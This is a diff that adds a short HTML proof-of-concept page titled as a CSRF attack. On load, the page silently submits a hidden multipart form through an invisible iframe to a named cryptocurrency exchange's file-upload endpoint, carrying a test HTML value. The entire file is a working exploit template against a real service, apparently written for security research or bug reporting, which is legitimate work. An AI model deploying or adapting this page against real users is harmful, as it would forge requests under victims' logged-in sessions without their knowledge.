@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack PoC</title>
+</head>
+<body>
+    <form id="csrfForm" action="https://www.okx.com/priapi/v3/growth/crm/upload" method="POST" enctype="multipart/form-data" target="hiddenIframe">
+        <input type="hidden" name="file" value="<strike>testme</strike>">
+    </form>
+    <iframe name="hiddenIframe" style="display:none;"></iframe>
+
+    <script>
+        document.getElementById("csrfForm").submit();
+    </script>
+</body>
+</html>
